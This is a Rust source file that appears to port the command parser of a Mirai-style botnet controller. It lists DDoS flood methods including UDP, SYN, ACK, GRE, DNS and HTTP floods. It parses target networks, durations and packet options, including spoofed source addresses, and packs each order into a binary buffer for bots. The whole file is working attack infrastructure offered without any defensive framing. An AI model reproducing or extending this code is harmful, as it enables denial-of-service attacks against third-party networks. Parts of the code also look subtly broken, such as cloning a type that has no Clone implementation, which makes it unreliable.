use std::collections::HashMap;
use std::io::{Error, ErrorKind};
use std::net::IpAddr;
use std::str::FromStr;
use std::time::Duration;
use std::net::Ipv4Addr;
use std::string::FromUtf8Error;
use std::fmt;

#[derive(Debug)]
struct AttackInfo {
    attack_id: u8,
    attack_flags: Vec<u8>,
    attack_description: String,
}

#[derive(Debug)]
struct Attack {
    duration: u32,
    attack_type: u8,
    targets: HashMap<u32, u8>, // Prefix/netmask
    flags: HashMap<u8, String>, // key=value
}

#[derive(Debug)]
struct FlagInfo {
    flag_id: u8,
    flag_description: String,
}

lazy_static::lazy_static! {
    static ref FLAG_INFO_LOOKUP: HashMap<String, FlagInfo> = {
        let mut m = HashMap::new();
        m.insert("len".to_string(), FlagInfo { flag_id: 0, flag_description: "Size of packet data, default is 512 bytes".to_string() });
        m.insert("rand".to_string(), FlagInfo { flag_id: 1, flag_description: "Randomize packet data content, default is 1 (yes)".to_string() });
        m.insert("tos".to_string(), FlagInfo { flag_id: 2, flag_description: "TOS field value in IP header, default is 0".to_string() });
        m.insert("ident".to_string(), FlagInfo { flag_id: 3, flag_description: "ID field value in IP header, default is random".to_string() });
        m.insert("ttl".to_string(), FlagInfo { flag_id: 4, flag_description: "TTL field in IP header, default is 255".to_string() });
        m.insert("df".to_string(), FlagInfo { flag_id: 5, flag_description: "Set the Dont-Fragment bit in IP header, default is 0 (no)".to_string() });
        m.insert("sport".to_string(), FlagInfo { flag_id: 6, flag_description: "Source port, default is random".to_string() });
        m.insert("dport".to_string(), FlagInfo { flag_id: 7, flag_description: "Destination port, default is random".to_string() });
        m.insert("domain".to_string(), FlagInfo { flag_id: 8, flag_description: "Domain name to attack".to_string() });
        m.insert("dhid".to_string(), FlagInfo { flag_id: 9, flag_description: "Domain name transaction ID, default is random".to_string() });
        m.insert("urg".to_string(), FlagInfo { flag_id: 11, flag_description: "Set the URG bit in IP header, default is 0 (no)".to_string() });
        m.insert("ack".to_string(), FlagInfo { flag_id: 12, flag_description: "Set the ACK bit in IP header, default is 0 (no) except for ACK flood".to_string() });
        m.insert("psh".to_string(), FlagInfo { flag_id: 13, flag_description: "Set the PSH bit in IP header, default is 0 (no)".to_string() });
        m.insert("rst".to_string(), FlagInfo { flag_id: 14, flag_description: "Set the RST bit in IP header, default is 0 (no)".to_string() });
        m.insert("syn".to_string(), FlagInfo { flag_id: 15, flag_description: "Set the ACK bit in IP header, default is 0 (no) except for SYN flood".to_string() });
        m.insert("fin".to_string(), FlagInfo { flag_id: 16, flag_description: "Set the FIN bit in IP header, default is 0 (no)".to_string() });
        m.insert("seqnum".to_string(), FlagInfo { flag_id: 17, flag_description: "Sequence number value in TCP header, default is random".to_string() });
        m.insert("acknum".to_string(), FlagInfo { flag_id: 18, flag_description: "Ack number value in TCP header, default is random".to_string() });
        m.insert("gcip".to_string(), FlagInfo { flag_id: 19, flag_description: "Set internal IP to destination ip, default is 0 (no)".to_string() });
        m.insert("method".to_string(), FlagInfo { flag_id: 20, flag_description: "HTTP method name, default is get".to_string() });
        m.insert("postdata".to_string(), FlagInfo { flag_id: 21, flag_description: "POST data, default is empty/none".to_string() });
        m.insert("path".to_string(), FlagInfo { flag_id: 22, flag_description: "HTTP path, default is /".to_string() });
        m.insert("conns".to_string(), FlagInfo { flag_id: 24, flag_description: "Number of connections".to_string() });
        m.insert("source".to_string(), FlagInfo { flag_id: 25, flag_description: "Source IP address, 255.255.255.255 for random".to_string() });
        m
    };
    static ref ATTACK_INFO_LOOKUP: HashMap<String, AttackInfo> = {
        let mut m = HashMap::new();
        m.insert("udp".to_string(), AttackInfo { attack_id: 0, attack_flags: vec![2, 3, 4, 0, 1, 5, 6, 7, 25], attack_description: "UDP flood".to_string() });
        m.insert("vse".to_string(), AttackInfo { attack_id: 1, attack_flags: vec![2, 3, 4, 5, 6, 7], attack_description: "Valve source engine specific flood".to_string() });
        m.insert("dns".to_string(), AttackInfo { attack_id: 2, attack_flags: vec![2, 3, 4, 5, 6, 7, 8, 9], attack_description: "DNS resolver flood using the targets domain, input IP is ignored".to_string() });
        m.insert("syn".to_string(), AttackInfo { attack_id: 3, attack_flags: vec![2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25], attack_description: "SYN flood".to_string() });
        m.insert("ack".to_string(), AttackInfo { attack_id: 4, attack_flags: vec![0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25], attack_description: "ACK flood".to_string() });
        m.insert("stomp".to_string(), AttackInfo { attack_id: 5, attack_flags: vec![0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16], attack_description: "TCP stomp flood".to_string() });
        m.insert("greip".to_string(), AttackInfo { attack_id: 6, attack_flags: vec![0, 1, 2, 3, 4, 5, 6, 7, 19, 25], attack_description: "GRE IP flood".to_string() });
        m.insert("greeth".to_string(), AttackInfo { attack_id: 7, attack_flags: vec![0, 1, 2, 3, 4, 5, 6, 7, 19, 25], attack_description: "GRE Ethernet flood".to_string() });
        m.insert("udpplain".to_string(), AttackInfo { attack_id: 9, attack_flags: vec![0, 1, 7], attack_description: "UDP flood with less options. optimized for higher PPS".to_string() });
        m.insert("http".to_string(), AttackInfo { attack_id: 10, attack_flags: vec![8, 7, 20, 21, 22, 24], attack_description: "HTTP flood".to_string() });
        m
    };
}

fn uint8_in_slice(a: u8, list: &[u8]) -> bool {
    list.contains(&a)
}

fn new_attack(str: &str, admin: i32) -> Result<Attack, Box<dyn std::error::Error>> {
    let mut atk = Attack {
        duration: 0,
        attack_type: 0,
        targets: HashMap::new(),
        flags: HashMap::new(),
    };

    let args: Vec<&str> = str.split_whitespace().collect();

    let mut atk_info: Option<AttackInfo> = None;

    // Parse attack name
    if args.is_empty() {
        return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Must specify an attack name")));
    } else {
        if args[0] == "?" {
            let mut valid_cmd_list = "\x1b[37;1mAvailable attack list\r\n\x1b[36;1m".to_string();
            for (cmd_name, atk_info) in ATTACK_INFO_LOOKUP.iter() {
                valid_cmd_list += &format!("{}: {}\r\n", cmd_name, atk_info.attack_description);
            }
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, valid_cmd_list)));
        }
        atk_info = ATTACK_INFO_LOOKUP.get(args[0]).cloned();
        if atk_info.is_none() {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, format!("\x1b[33;1m{} \x1b[31mis not a valid attack!", args[0]))));
        }
        atk.attack_type = atk_info.clone().unwrap().attack_id;
    }

    // Parse targets
    let args = &args[1..];
    if args.is_empty() {
        return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Must specify prefix/netmask as targets")));
    } else {
        if args[0] == "?" {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, "\x1b[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")));
        }
        let cidr_args: Vec<&str> = args[0].split(',').collect();
        if cidr_args.len() > 255 {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Cannot specify more than 255 targets in a single attack!")));
        }
        for cidr in cidr_args {
            let mut parts = cidr.split('/');
            let prefix = parts.next().ok_or("Blank target specified!")?;
            let netmask = parts.next().unwrap_or("32").parse::<u8>().map_err(|_| format!("Invalid netmask was supplied, near {}", cidr))?;

            if netmask > 32 {
                return Err(Box::new(Error::new(ErrorKind::InvalidInput, format!("Invalid netmask was supplied, near {}", cidr))));
            }

            let ip: Ipv4Addr = prefix.parse().map_err(|_| format!("Failed to parse IP address, near {}", cidr))?;
            let prefix_bytes = ip.octets();
            let prefix_int = u32::from_be_bytes([prefix_bytes[0], prefix_bytes[1], prefix_bytes[2], prefix_bytes[3]]);
            atk.targets.insert(prefix_int, netmask);
        }
    }

    // Parse attack duration time
    let args = &args[1..];
    if args.is_empty() {
        return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Must specify an attack duration")));
    } else {
        if args[0] == "?" {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, "\x1b[37;1mDuration of the attack, in seconds")));
        }
        let duration: u32 = args[0].parse().map_err(|_| format!("Invalid attack duration, near {}. Duration must be between 0 and 3600 seconds", args[0]))?;
        if duration == 0 || duration > 3600 {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, format!("Invalid attack duration, near {}. Duration must be between 0 and 3600 seconds", args[0]))));
        }
        atk.duration = duration;
    }

    // Parse flags
    let args = &args[1..];
    if args.is_empty() {
        return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Must specify flags")));
    }
    for arg in args {
        if arg == "?" {
            let mut valid_flags = "\x1b[37;1mList of flags key=val separated by spaces. Valid flags for this method are\r\n\r\n".to_string();
            if let Some(atk_info) = atk_info {
                for flag_id in atk_info.attack_flags {
                    for (flag_name, flag_info) in FLAG_INFO_LOOKUP.iter() {
                        if flag_id == flag_info.flag_id {
                            valid_flags += &format!("{}: {}\r\n", flag_name, flag_info.flag_description);
                            break;
                        }
                    }
                }
            }
            valid_flags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n";
            valid_flags += "Ex: seq=0\r\nEx: sport=0 dport=65535";
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, valid_flags)));
        }
        let flag_split: Vec<&str> = arg.splitn(2, '=').collect();
        if flag_split.len() != 2 {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, format!("Invalid key=value flag combination near {}", arg))));
        }
        let flag_info = FLAG_INFO_LOOKUP.get(flag_split[0]).ok_or(format!("Invalid flag key {}, near {}", flag_split[0], arg))?;
        if !uint8_in_slice(flag_info.flag_id, &atk_info.as_ref().unwrap().attack_flags) || (admin == 0 && flag_info.flag_id == 25) {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, format!("Invalid flag key {}, near {}", flag_split[0], arg))));
        }
        let mut flag_value = flag_split[1].to_string();
        if flag_value.starts_with('"') {
            flag_value = flag_value[1..flag_value.len() - 1].to_string();
        }
        if flag_value == "true" {
            flag_value = "1".to_string();
        } else if flag_value == "false" {
            flag_value = "0".to_string();
        }
        atk.flags.insert(flag_info.flag_id, flag_value);
    }
    if atk.flags.len() > 255 {
        return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Cannot have more than 255 flags")));
    }

    Ok(atk)
}

impl Attack {
    fn build(&self) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let mut buf = Vec::new();

        // Add in attack duration
        buf.extend(&self.duration.to_be_bytes());

        // Add in attack type
        buf.push(self.attack_type);

        // Send number of targets
        buf.push(self.targets.len() as u8);

        // Send targets
        for (prefix, netmask) in &self.targets {
            buf.extend(&prefix.to_be_bytes());
            buf.push(*netmask);
        }

        // Send number of flags
        buf.push(self.flags.len() as u8);

        // Send flags
        for (key, val) in &self.flags {
            let mut tmp = Vec::with_capacity(2 + val.len());
            tmp.push(*key);
            let val_bytes = val.as_bytes();
            if val_bytes.len() > 255 {
                return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Flag value cannot be more than 255 bytes!")));
            }
            tmp.push(val_bytes.len() as u8);
            tmp.extend_from_slice(val_bytes);
            buf.extend(tmp);
        }

        // Specify the total length
        if buf.len() > 4096 {
            return Err(Box::new(Error::new(ErrorKind::InvalidInput, "Max buffer is 4096")));
        }
        let len = (buf.len() + 2) as u16;
        let mut len_buf = Vec::with_capacity(2);
        len_buf.extend(&len.to_be_bytes());
        len_buf.extend(buf);
        Ok(len_buf)
    }
}
